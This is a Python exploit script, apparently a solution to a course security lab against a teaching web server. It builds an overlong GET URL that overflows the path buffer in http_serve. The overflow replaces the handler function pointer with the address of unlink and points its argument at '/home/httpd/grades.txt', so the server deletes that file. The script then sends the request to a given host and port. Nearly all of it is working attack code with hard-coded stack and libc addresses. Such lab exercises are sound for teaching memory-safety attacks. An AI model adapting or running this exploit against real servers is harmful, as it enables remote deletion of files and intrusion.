#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit():
    ## http.c: http_serve.
    ##  C:
    ##   void http_serve(int fd, const char *name)
    ##   {
    ##       void (*handler)(int, const char *) = http_serve_none;
    ##       char pn[1024];
    ##       struct stat st;
    ##   
    ##       getcwd(pn, sizeof(pn));
    ##       setenv("DOCUMENT_ROOT", pn, 1);
    ##   
    ##       strcat(pn, name);
    ##       split_path(pn);
    ##   
    ##       if (!stat(pn, &st))
    ##       {
    ##           /* executable bits -- run as CGI script */
    ##           if (valid_cgi_script(&st))
    ##               handler = http_serve_executable;
    ##           else if (S_ISDIR(st.st_mode))
    ##               handler = http_serve_directory;
    ##           else
    ##               handler = http_serve_file;
    ##       }
    ##   
    ##       handler(fd, pn);
    ##   }
    ##
    ## unlink = 0x40102450
    ## ebp = 0xbfffde08
    ## &pn = 0xbfffd9fc
    ## &handler = 0xbfffddfc
    ## &fd (first parameter of handler) = ebp+8

    unlink_addr = 0x40102450
    pn_addr = 0xbfffd9fc 
    handler_addr = 0xbfffddfc
    ebp_addr = 0xbfffde08

    bad_url = '/' + ('a' * (handler_addr - pn_addr - len('/home/httpd/lab/')))
    bad_url += struct.pack("<I", 0x40102450)    # hijack to handler
    bad_url += struct.pack("<I", 0x12345678)
    bad_url += struct.pack("<I", 0x12345678)
    bad_url += struct.pack("<I", 0x12345678)
    bad_url += struct.pack("<I", 0x12345678)    # pad four 32bit numbers till ebp+8 (fd)
    bad_url += struct.pack("<I", ebp_addr + 12) # address of "/home/httpd/grades.txt"
    bad_url += "/home/httpd/grades.txt"

    req =   "GET " + urllib.quote(bad_url) + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    req = build_exploit()
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())


